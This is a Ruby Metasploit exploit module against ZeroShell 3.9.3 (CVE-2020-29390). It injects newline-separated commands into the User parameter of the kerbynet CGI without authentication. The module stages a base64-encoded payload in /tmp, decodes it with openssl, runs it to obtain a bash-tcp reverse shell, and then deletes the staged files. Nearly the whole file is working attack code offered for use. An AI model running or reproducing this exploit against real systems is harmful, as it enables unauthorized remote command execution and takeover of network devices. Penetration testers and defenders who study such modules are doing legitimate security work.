require 'cgi'

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zeroshell 3.9.3 Remote Command Execution',
      'Description'    => %q{
        This module exploits an unauthenticated command injection vulnerability 
        found in ZeroShell 3.9.3. The User parameter can be abused to execute
        arbitrary os commands.
      },
      'Author'         => ['mario ceballos',],
      'References'     => [
        ['CVE', '2020-29390'],
        ['URL', 'https://www.d2sec.com/updates/d2_exploitation_pack_2.60.html'],
        ['URL', 'https://blog.quake.so/post/zeroshell_linux_router_rce/']
      ],
      'DisclosureDate' => 'Nov 28 2020',
      'License'        => BSD_LICENSE,
      'Privileged'     => false,
      'Payload'        =>
        {
         'Compat'      =>
          {
           'PayloadType' => 'cmd_bash',
           'RequiredCmd' => 'bash-tcp',
          }
        }, 
      'Platform'       => [ 'unix' ],
      'Arch'           => [ ARCH_CMD ],
      'Targets'        => [
       [ 'Zeroshell 3.9.3 (x86)', {} ],
      ],
      'DefaultTarget'  => 0,
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
      ])
  end

  def exploit
    first  = Rex::Text.rand_text_alpha_upper(5) + ".lalo"
    second = Rex::Text.rand_text_alpha_upper(5) + ".lalo"

    data = [
     "echo " + Rex::Text.encode_base64(payload.raw) + " > /tmp/#{first}",
     "/usr/local/ssl/bin/openssl base64 -d -in /tmp/#{first} -out /tmp/#{second}",
     "sh /tmp/#{second}"
    ]
   
    data.each do |datas|

    real_payload = "'%0a" + CGI.escape(datas) + "%0a'"
    
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/cgi-bin/kerbynet',
      'encode_params' => false,
      'vars_get' => {
        'Action' => 'StartSessionSubmit',
        'User' => real_payload,
        'PE' => '' 
     }
   )
   end
  end

  def cmd_exec(session, cmd)
    case session.type
     when /shell/
       o = session.shell_command_token(cmd)
       o.chomp! if o
     end
    return "" if o.nil?
   return o
  end

  def on_new_session(session)
    print_status("Removing staged scripts...")
    cmd_exec(session, "rm -rf /tmp/*.lalo")
    super
  end

end
